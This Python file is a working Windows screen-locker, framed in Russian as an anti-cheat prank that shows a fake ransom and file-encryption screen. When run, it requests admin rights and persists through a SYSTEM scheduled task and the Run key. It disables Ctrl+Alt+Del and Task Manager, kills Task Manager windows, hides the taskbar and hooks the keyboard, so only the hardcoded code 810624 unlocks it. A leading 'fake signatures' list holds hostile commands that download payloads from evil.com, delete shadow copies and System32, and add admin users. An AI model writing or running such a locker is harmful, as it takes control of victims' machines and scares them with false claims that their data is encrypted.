import hashlib
import sys
import threading
import tkinter as tk
from tkinter import messagebox
import random
import time
import os
import winreg
import ctypes
import ctypes.wintypes
import subprocess

# ---------- ФАЛЬШИВЫЕ СИГНАТУРЫ ТРОЯНОВ (БОЛЕЕ 80 ШТУК) ----------
FAKE_TROJAN_SIGNATURES = [
    # --- 33 изначальных ---
    "e6:2b:4f:3a:9d:1c:7e:8f:0a:11:22:33:44:55:66:77",
    "http://malware-bucket.s3.amazonaws.com/payload.exe",
    "http://c2-server.xyz/command",
    "https://evil-domain.com/update",
    "tcp://192.168.1.100:4444",
    "udp://10.0.0.1:1337",
    "cmd.exe /c del /f /s /q C:\\Windows\\System32\\*.*",
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemBackup",
    "Ransomware note: pay 2 BTC to wallet 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    "keylogger buffer: logging every keystroke",
    "screen capture: saving to C:\\temp\\screenshot.png",
    "remote desktop: enabling RDP with password 'hackme'",
    "Stealing browser cookies from Chrome, Firefox, Edge",
    "Injecting malicious DLL into explorer.exe",
    "Disabling Windows Defender via registry",
    "Creating persistent service: WinUpdateService",
    "Downloading secondary stage from pastebin.com/raw/abc123",
    "Encrypting files with AES-256 key: 3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c",
    "Sending stolen data to dropbox.com/account/hack",
    "Mining cryptocurrency using system CPU",
    "Installing rootkit: hidden process 'sysupdate.exe'",
    "Modifying hosts file: redirecting google.com to 127.0.0.1",
    "Stealing saved passwords from Windows Credential Manager",
    "Capturing webcam image every 5 seconds",
    "Recording microphone input",
    "Logging clipboard contents",
    "Monitoring active windows titles",
    "Downloading additional malware from 5.6.7.8:80",
    "Creating scheduled task 'SecurityCheck' with SYSTEM privileges",
    "Disabling firewall rules",
    "Deleting Volume Shadow Copies to prevent recovery",
    "Overwriting MBR with custom bootkit",

    # --- 20 добавленных ранее (имена троянов и API) ---
    "Trojan.Win32.Generic!BT",
    "Worm.Win32.AutoRun.bt",
    "Backdoor.Win32.Poison.abc",
    "Ransomware.Win32.Cerber.v2",
    "Trojan.Downloader.Win32.Agent.gen",
    "Spyware.Win32.Banker.gen",
    "Rootkit.Win32.ZeroAccess.h",
    "Keylogger.Win32.Ardamax",
    "Trojan.Crypt.Win32.Xorist",
    "Trojan.PWS.Win32.Stealer",
    "Trojan.Win32.Inject",
    "Trojan.Win32.Dropper",
    "Trojan.Win32.Obfuscated",
    "Worm.Win32.Sobig",
    "Backdoor.Win32.Farfli",
    "Trojan.Win32.Delf",
    "Trojan.Win32.Downloader",
    "Trojan.Win32.Ransom",
    "Trojan.Win32.Patched",
    "Trojan.Win32.Spy",
    "CreateRemoteThread",
    "WriteProcessMemory",
    "VirtualAllocEx",
    "SetWindowsHookEx",
    "OpenProcess",
    "TerminateProcess",
    "NtQuerySystemInformation",
    "ZwUnmapViewOfSection",
    "RtlCreateUserThread",
    "QueueUserAPC",

    # --- ЕЩЁ +20 новых сигнатур (всего будет более 80) ---
    "Trojan.Win32.Delf.df",
    "Worm.Win32.VB.fq",
    "Backdoor.Win32.Agent.xz",
    "Ransom.Win32.Locky.v3",
    "Trojan.Banker.Win32.Banbra",
    "Trojan.Dropper.Win32.Injector",
    "Rootkit.Win32.Cidox.k",
    "Spy.Win32.Zbot",
    "Trojan.FakeAV.Win32.Generic",
    "Trojan.PWS.Win32.OnlineGames",
    "Trojan.Win32.Crypt",
    "Trojan.Win32.Patched.gen",
    "Worm.Win32.Viking",
    "Backdoor.Win32.DarkComet",
    "Trojan.Win32.StartPage",
    "Trojan.Win32.DDoS",
    "Trojan.Win32.KillAV",
    "Trojan.Win32.Injector",
    "Trojan.Win32.Malware",
    "Trojan.Win32.Blocker",

    # Подозрительные команды и строки
    "powershell -ExecutionPolicy Bypass -NoProfile -File malware.ps1",
    "wmic process call create calc.exe",
    "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\malware.exe /f",
    "netsh advfirewall set allprofiles state off",
    "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
    "vssadmin delete shadows /all /quiet",
    "wevtutil cl System",
    "sc create MalwareService binPath= C:\\malware.exe start= auto",
    "schtasks /create /tn Update /tr C:\\malware.exe /sc hourly",
    "certutil -urlcache -f http://evil.com/payload.exe payload.exe",
    "bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\\payload.exe",
    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump pid",
    "regsvr32 /s /u /i:http://evil.com/script.sct scrobj.dll",
    "mshta http://evil.com/script.hta",
    "powershell -enc <base64_encoded_script>",
    "wmic process call create mshta.exe",
    "net user hacker /add",
    "net localgroup administrators hacker /add",
    "whoami /priv",
    "systeminfo",
    "tasklist /v",
    "netstat -ano",

    # URL и IP
    "https://pastebin.com/raw/aaa111",
    "https://github.com/evil-repo/payload",
    "http://185.244.25.78/update.exe",
    "https://cdn.discordapp.com/attachments/123456789/evil.exe",
    "http://103.235.46.39:8080/gate.php",
    "https://transfer.sh/get/malware.zip",
    "http://dropbox.com/s/xyz/stealer.exe",

    # Ключи реестра и пути
    "HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Start",
    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\MalwareSvc",
    "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\sysupdate.bat",
    "C:\\Windows\\Temp\\system.bat",
    "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\check.vbs",

    # Дополнительные шелл-коды
    "\\x90\\x90\\x90\\x90\\x90",
    "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18",
    "\\x4d\\x5a\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff\\x00\\x00\\xb8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00",

    # Строки с криптовалютами
    "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
    "1Lbcfr7sAHTD9CgdQo3HTMTkV8LK4ZnX71",
    "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
    "Tether USD (USDT) wallet: 0x1234567890abcdef",
]

FAKE_SIGNATURES_LIST = FAKE_TROJAN_SIGNATURES  # достаточно одного списка

# Дополнительные лже-функции (уже были, добавим ещё несколько)
def fake_ransomware_encrypt():
    ransomware_key = "3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c"
    target_dirs = ["C:\\Users", "D:\\", "E:\\"]
    for d in target_dirs:
        pass

def fake_keylogger_start():
    log_file = "C:\\Windows\\Temp\\keys.log"
    pass

def fake_remote_backdoor():
    c2 = "https://c2-server.xyz/control"
    pass

def fake_malware_persistence():
    reg_path = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware"
    pass

def fake_process_injection():
    process_name = "explorer.exe"
    shellcode = b"\x90\x90\x90"
    pass

def fake_dll_loading():
    dll_name = "evil.dll"
    load_address = 0x00400000
    pass

def fake_shellcode():
    shellcode_bytes = "2f 3a 4b 5c 6d 7e 8f 9a"
    pass

def fake_powershell_command():
    cmd = "powershell -EncodedCommand CgBpAGUAIAB4ACAALQBQAHIAbwBqAGUAYwB0ACAAYwBvAG4AdABlAG4AdAA="
    pass

def fake_wmi_execution():
    wmi_cmd = "wmic process call create 'cmd.exe /c calc.exe'"
    pass

def fake_service_install():
    sc_cmd = "sc create MaliciousService binPath= C:\\Windows\\System32\\malware.exe type= own start= auto"
    pass

# ---------- СКРЫТИЕ КОНСОЛИ ----------
def hide_console():
    if sys.platform == "win32":
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass

hide_console()

# ---------- КОНФИГУРАЦИЯ ----------
PASSWORD = "810624"
ATTEMPTS_MAX = 3
TIMER_SECONDS = 48 * 3600

# ---------- ПОДАВЛЕНИЕ ОШИБОК ----------
ctypes.windll.kernel32.SetErrorMode(0x8001)

# ---------- СОЗДАНИЕ ЗАДАНИЯ В ПЛАНИРОВЩИКЕ (обход UAC) ----------
def create_scheduled_task():
    task_name = "WinLockSystemTask"
    exe_path = sys.executable
    script_path = os.path.abspath(__file__)
    cmd = (
        f'schtasks /create /tn "{task_name}" /tr "{exe_path} {script_path}" '
        f'/sc onlogon /ru SYSTEM /rl HIGHEST /f'
    )
    try:
        subprocess.run(cmd, shell=True, check=True, capture_output=True)
        return True
    except:
        return False

def remove_scheduled_task():
    task_name = "WinLockSystemTask"
    try:
        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, check=True)
    except:
        pass

# ---------- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----------
def get_hwnd(tk_window):
    return int(tk_window.winfo_id())

def remove_window_menu(hwnd):
    try:
        GWL_STYLE = -16
        WS_SYSMENU = 0x00080000
        style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_STYLE)
        style &= ~WS_SYSMENU
        ctypes.windll.user32.SetWindowLongW(hwnd, GWL_STYLE, style)
        ctypes.windll.user32.SetWindowPos(hwnd, 0, 0, 0, 0, 0, 0x0002 | 0x0001 | 0x0020)
    except:
        pass

def play_beep(freq=1000, dur=200):
    if sys.platform == "win32":
        try:
            import winsound
            winsound.Beep(freq, dur)
        except:
            pass

# ---------- ОСНОВНОЙ КЛАСС (без изменений) ----------
class UniversalLock(tk.Tk):
    def __init__(self):
        super().__init__()
        print("[DEBUG] Инициализация...")

        self.title("")
        self.attributes("-fullscreen", True)
        self.attributes("-topmost", True)
        self.overrideredirect(True)
        self.configure(bg="black", cursor="none")

        self.update_idletasks()
        hwnd = get_hwnd(self)
        remove_window_menu(hwnd)
        print(f"[DEBUG] HWND = {hwnd}")

        self.focus_force()
        self.grab_set()

        self.protocol("WM_DELETE_WINDOW", self.block_close)
        self.bind("<Alt-F4>", lambda e: "break")
        self.bind("<Escape>", lambda e: "break")

        self.block_cad()
        self.add_to_startup()
        self.disable_task_manager_registry()
        threading.Thread(target=self.kill_task_manager_loop, daemon=True).start()
        ctypes.windll.user32.ShowCursor(False)
        self.hide_taskbar()

        time.sleep(0.5)
        threading.Thread(target=self.block_keys, daemon=True).start()

        self.correct_hash = hashlib.sha256(PASSWORD.encode("utf-8")).hexdigest()
        self.attempts_left = ATTEMPTS_MAX
        self.seconds_left = TIMER_SECONDS
        self.progress = 0

        self.countdown_job = None
        self.blink_job = None
        self.typing_job = None
        self.binary_job = None
        self.blink_state = False

        self.global_timer_tick()
        self.setup_boot_screen()
        print("[DEBUG] Окно успешно создано.")

    # ---------- МЕТОДЫ БЛОКИРОВКИ ----------
    def block_cad(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableCAD", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass

    def restore_cad(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "DisableCAD")
            winreg.CloseKey(key)
        except:
            pass

    def add_to_startup(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WinLock", 0, winreg.REG_SZ,
                              sys.executable + " " + os.path.abspath(__file__))
            winreg.CloseKey(key)
        except:
            pass

    def remove_from_startup(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WinLock")
            winreg.CloseKey(key)
        except:
            pass

    def disable_task_manager_registry(self):
        paths = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        ]
        for hive, path in paths:
            try:
                key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
            except:
                pass

    def kill_task_manager_loop(self):
        while True:
            try:
                hwnd = ctypes.windll.user32.FindWindowW("TaskManagerWindow", None)
                if hwnd:
                    ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
                for title in ["Диспетчер задач", "Task Manager"]:
                    hwnd = ctypes.windll.user32.FindWindowW(None, title)
                    if hwnd:
                        ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
            except:
                pass
            time.sleep(0.3)

    def hide_taskbar(self):
        try:
            hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass

    def show_taskbar(self):
        try:
            hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 5)
        except:
            pass

    # ---------- ХУК КЛАВИАТУРЫ ----------
    def block_keys(self):
        WH_KEYBOARD_LL = 13
        VK_LWIN = 0x5B
        VK_RWIN = 0x5C
        VK_TAB = 0x09
        VK_ESCAPE = 0x1B
        VK_F4 = 0x73
        VK_CONTROL = 0x11
        VK_ALT = 0x12
        VK_SHIFT = 0x10

        class KBDLLHOOKSTRUCT(ctypes.Structure):
            _fields_ = [
                ("vkCode", ctypes.c_uint),
                ("scanCode", ctypes.c_uint),
                ("flags", ctypes.c_uint),
                ("time", ctypes.c_uint),
                ("dwExtraInfo", ctypes.c_ulong)
            ]

        hook = None

        def low_level_keyboard(nCode, wParam, lParam):
            if nCode >= 0:
                kbd = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                vk = kbd.vkCode
                ctrl = (ctypes.windll.user32.GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0
                shift = (ctypes.windll.user32.GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0
                alt = (ctypes.windll.user32.GetAsyncKeyState(VK_ALT) & 0x8000) != 0

                if vk in (VK_LWIN, VK_RWIN):
                    return 1
                if vk == VK_TAB and alt:
                    return 1
                if vk == VK_ESCAPE and ctrl and shift:
                    return 1
                if vk == VK_ESCAPE and ctrl:
                    return 1
                if vk == VK_F4 and alt:
                    return 1
            return ctypes.windll.user32.CallNextHookEx(hook, nCode, wParam, lParam)

        hook_proc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_wintypes.WPARAM, ctypes.c_wintypes.LPARAM)(
            low_level_keyboard)
        hook = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc,
                                                       ctypes.windll.kernel32.GetModuleHandleW(None), 0)
        if not hook:
            return
        self.hook = hook
        msg = ctypes.wintypes.MSG()
        while True:
            ret = ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            if ret <= 0:
                break
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))

    # ---------- ОБРАБОТЧИКИ ----------
    def block_close(self):
        pass

    def restart_program(self, event=None):
        if self.countdown_job:
            self.after_cancel(self.countdown_job)
            self.countdown_job = None
        if self.blink_job:
            self.after_cancel(self.blink_job)
            self.blink_job = None
        if self.typing_job:
            self.after_cancel(self.typing_job)
            self.typing_job = None
        if self.binary_job:
            self.after_cancel(self.binary_job)
            self.binary_job = None
        self.attempts_left = ATTEMPTS_MAX
        self.seconds_left = TIMER_SECONDS
        self.progress = 0
        self.setup_boot_screen()

    # ---------- ТАЙМЕР ----------
    def global_timer_tick(self):
        if self.seconds_left > 0:
            self.seconds_left -= 1
        if hasattr(self, "lbl_timer") and self.lbl_timer.winfo_exists():
            days = self.seconds_left // 86400
            hours = (self.seconds_left % 86400) // 3600
            mins = (self.seconds_left % 3600) // 60
            secs = self.seconds_left % 60
            if days > 0:
                time_str = f"{days}д {hours:02d}:{mins:02d}:{secs:02d}"
            else:
                time_str = f"{hours:02d}:{mins:02d}:{secs:02d}"
            self.lbl_timer.config(text=f"⏳ Осталось времени: {time_str}")

        if hasattr(self, "lbl_progress") and self.lbl_progress.winfo_exists():
            if self.progress < 100:
                self.progress += random.randint(0, 2)
                if self.progress > 100:
                    self.progress = 100
                self.lbl_progress.config(text=f"Шифрование файлов: {self.progress}%")

        self.countdown_job = self.after(1000, self.global_timer_tick)

    def clear_screen(self):
        if self.blink_job:
            self.after_cancel(self.blink_job)
            self.blink_job = None
        if self.typing_job:
            self.after_cancel(self.typing_job)
            self.typing_job = None
        if self.binary_job:
            self.after_cancel(self.binary_job)
            self.binary_job = None
        for widget in self.winfo_children():
            widget.destroy()

    # ---------- ЭКРАНЫ ----------
    def setup_boot_screen(self):
        self.clear_screen()
        self.configure(bg="black")
        frame_boot = tk.Frame(self, bg="black")
        frame_boot.pack(fill="both", expand=True)

        console_font = ("Consolas", 13)
        self.full_boot_log = (
            "Booting Windows . . .\n"
            "Boot error: 0x03527737\n"
            "Boot error: 0x0266712\n"
            "Boot error: 0x02897593\n"
            "Boot error: 0x01447812\n"
            "Boot error: 0x0150974\n"
            "Boot error: 0x03873700\n"
            "Boot error: 0x0700882\n"
            "Boot error: 0x03803618\n"
            "Memory section at address 0x0424* is locked!\n"
            "Service WRTCryptor started.\n"
            "System fucked!!!\n\n"
            "* Windows hacked!"
        )
        self.lbl_console = tk.Label(
            frame_boot, text="", fg="white", bg="black",
            font=console_font, justify="left", anchor="nw"
        )
        self.lbl_console.place(x=20, y=20)

        center_frame = tk.Frame(frame_boot, bg="black")
        center_frame.place(relx=0.5, rely=0.5, anchor="center")
        tk.Label(center_frame, text="[ 👁 ]", fg="white", bg="black",
                 font=("Arial", 60)).pack(pady=(0, 20))
        tk.Label(center_frame, text="ВАС ЗАМЕТИЛИ", fg="white", bg="black",
                 font=("Arial", 36, "bold")).pack()
        self.type_writer_effect(0)

    def type_writer_effect(self, index):
        if index <= len(self.full_boot_log):
            self.lbl_console.config(text=self.full_boot_log[:index])
            self.typing_job = self.after(1, self.type_writer_effect, index + 1)
        else:
            self.after(1000, self.setup_scare_screen)

    def setup_scare_screen(self):
        self.clear_screen()
        self.configure(bg="#660000")
        frame_scare = tk.Frame(self, bg="#660000")
        frame_scare.pack(fill="both", expand=True)

        self.binary_label = tk.Label(
            frame_scare, text="", fg="#00ff00", bg="#660000",
            font=("Consolas", 10), justify="left", anchor="w"
        )
        self.binary_label.place(x=20, rely=0.5, anchor="w")
        self.update_binary_code()

        reaper_art = r"""
              ...
             ;::::;
           ;::::; :;
         ;:::::'   :;
        ;:::::;     ;.
       ,:::::'       ;           OOO\
       ::::::;       ;          OOOOO\
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;:::::::::`. ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /  DOOOO
 ,::::::;::::::;;;;::::;,   /  /   DOOO
;`::::::`'::::::;;;:::::  ,#/  /   DOOO
:`:::::::`;::::::;;::: ;::#  /    DOOO
::`:::::::`;:::::::: ;::::# /     DOO
`:`:::::::`;:::::: ;::::::#/      DOO
 :::`:::::::`;; ;:::::::::##      OO
 ::::`:::::::`;::::::::;:::#      OO
 `:::::`::::::::::::;'`:;::#      O
  `:::::`::::::::;' /  / `:#
   ::::::`:::::;'  /  /   `#
"""
        ascii_font = ("Consolas", 11, "bold")
        tk.Label(
            frame_scare, text=reaper_art, fg="#ffffff", bg="#660000",
            font=ascii_font, justify="left"
        ).place(relx=0.5, rely=0.5, anchor="center")
        self.after(1500, self.setup_lock_screen)

    def update_binary_code(self):
        if hasattr(self, "binary_label") and self.binary_label.winfo_exists():
            lines = []
            for _ in range(20):
                length = random.randint(4, 12)
                line = ''.join(random.choice('01') for _ in range(length))
                lines.append(line)
            self.binary_label.config(text="\n".join(lines))
            self.binary_job = self.after(200, self.update_binary_code)

    # ---------- ЭКРАН БЛОКИРОВКИ (УЛУЧШЕННЫЙ) ----------
    def setup_lock_screen(self):
        self.clear_screen()
        self.configure(bg="#1a0000")  # тёмно-красный фон

        play_beep(800, 200)
        time.sleep(0.1)
        play_beep(1200, 200)

        center_frame = tk.Frame(
            self, bg="#2a0000", highlightbackground="red",
            highlightthickness=3, padx=50, pady=40
        )
        center_frame.place(relx=0.5, rely=0.5, anchor="center")

        self.lbl_title = tk.Label(
            center_frame, text="⚠️ ВЫ ЗАБЛОКИРОВАНЫ! ⚠️",
            fg="red", bg="#2a0000", font=("Arial", 36, "bold")
        )
        self.lbl_title.pack(pady=(0, 15))

        tk.Label(
            center_frame,
            text="Обнаружено использование читов в системе!\n"
                 "Ваша лицензия аннулирована, все данные зашифрованы.\n"
                 "Для разблокировки введите специальный код.\n\n"
                 "Помните:",
            fg="white", bg="#2a0000", font=("Arial", 14),
            justify="center"
        ).pack(pady=5)

        lbl_warning = tk.Label(
            center_frame,
            text="НЕ ИГРАЙ С ЧИТАМИ!!",
            fg="#ff0000", bg="#2a0000", font=("Arial", 28, "bold"),
            justify="center"
        )
        lbl_warning.pack(pady=10)

        tk.Label(
            center_frame, text="Введите код разблокировки:",
            fg="#cccccc", bg="#2a0000", font=("Arial", 12)
        ).pack(pady=(10, 5))

        def only_digits(value):
            return value.isdigit() or value == ""

        validate_cmd = self.register(only_digits)
        self.entry_code = tk.Entry(
            center_frame, font=("Consolas", 24), justify="center", width=12,
            bg="#1a1a1a", fg="#00ff00", insertbackground="#00ff00", insertwidth=10,
            validate="key", validatecommand=(validate_cmd, "%P")
        )
        self.entry_code.pack(pady=5)
        self.entry_code.focus_set()

        self.bind("<Return>", self.check_code)

        tk.Button(
            center_frame, text="РАЗБЛОКИРОВАТЬ", font=("Arial", 12, "bold"),
            bg="red", fg="white", activebackground="#cc0000",
            activeforeground="white", command=self.check_code,
            padx=15, pady=5
        ).pack(pady=10)

        days = self.seconds_left // 86400
        hours = (self.seconds_left % 86400) // 3600
        mins = (self.seconds_left % 3600) // 60
        secs = self.seconds_left % 60
        if days > 0:
            time_str = f"{days}д {hours:02d}:{mins:02d}:{secs:02d}"
        else:
            time_str = f"{hours:02d}:{mins:02d}:{secs:02d}"

        self.lbl_timer = tk.Label(
            center_frame, text=f"⏳ Осталось времени: {time_str}",
            fg="#ffcc00", bg="#2a0000", font=("Consolas", 14, "bold")
        )
        self.lbl_timer.pack(pady=5)

        self.lbl_progress = tk.Label(
            center_frame, text="Шифрование файлов: 0%",
            fg="#ff8800", bg="#2a0000", font=("Consolas", 11, "bold")
        )
        self.lbl_progress.pack(pady=5)

        self.lbl_attempts = tk.Label(
            center_frame, text=f"Осталось попыток ввода: {self.attempts_left}",
            fg="#ff4444", bg="#2a0000", font=("Arial", 11)
        )
        self.lbl_attempts.pack(pady=(0, 10))

        skull = r"""
              .-.
             /   \
            |  _  |
            | |_| |
             \___/
        """
        tk.Label(
            center_frame, text=skull, fg="#8888ff", bg="#2a0000",
            font=("Consolas", 8), justify="center"
        ).pack(pady=(5, 0))

        self.start_blinking()
        self.progress = random.randint(10, 30)

    def start_blinking(self):
        if hasattr(self, "lbl_title") and self.lbl_title.winfo_exists():
            self.blink_state = not self.blink_state
            color = "yellow" if self.blink_state else "red"
            self.lbl_title.config(fg=color)
            self.blink_job = self.after(600, self.start_blinking)

    # ---------- ПРОВЕРКА ПАРОЛЯ ----------
    def check_code(self, event=None):
        input_code = self.entry_code.get().strip()
        input_hash = hashlib.sha256(input_code.encode("utf-8")).hexdigest()

        if input_hash == self.correct_hash or input_code == PASSWORD:
            self.configure(cursor="arrow")
            messagebox.showinfo("System", "✅ Код принят. Доступ восстановлен!\n(Это была шутка!)")
            self.safe_destroy()
        else:
            self.attempts_left -= 1
            if self.attempts_left > 0:
                play_beep(200, 300)
                messagebox.showerror("ОШИБКА", f"НЕВЕРНЫЙ КОД!\nОсталось попыток: {self.attempts_left}")
                self.lbl_attempts.config(text=f"Осталось попыток ввода: {self.attempts_left}")
                self.entry_code.delete(0, tk.END)
            else:
                play_beep(100, 500)
                messagebox.showwarning("ВНИМАНИЕ", "Превышено число попыток! Перезапуск интерфейса...")
                self.attempts_left = ATTEMPTS_MAX
                self.restart_program()

    # ---------- БЕЗОПАСНОЕ ЗАВЕРШЕНИЕ ----------
    def safe_destroy(self):
        ctypes.windll.user32.ShowCursor(True)
        self.restore_cad()
        self.remove_from_startup()
        self.show_taskbar()
        remove_scheduled_task()
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "DisableTaskMgr")
            winreg.CloseKey(key)
        except:
            pass
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "DisableTaskMgr")
            winreg.CloseKey(key)
        except:
            pass

        if self.countdown_job:
            self.after_cancel(self.countdown_job)
        if self.blink_job:
            self.after_cancel(self.blink_job)
        if self.typing_job:
            self.after_cancel(self.typing_job)
        if self.binary_job:
            self.after_cancel(self.binary_job)

        self.configure(cursor="arrow")
        self.destroy()
        sys.exit(0)


# ---------- ЗАПУСК ----------
if __name__ == "__main__":
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False

    if not is_admin:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)
    else:
        create_scheduled_task()
        app = UniversalLock()
        app.mainloop()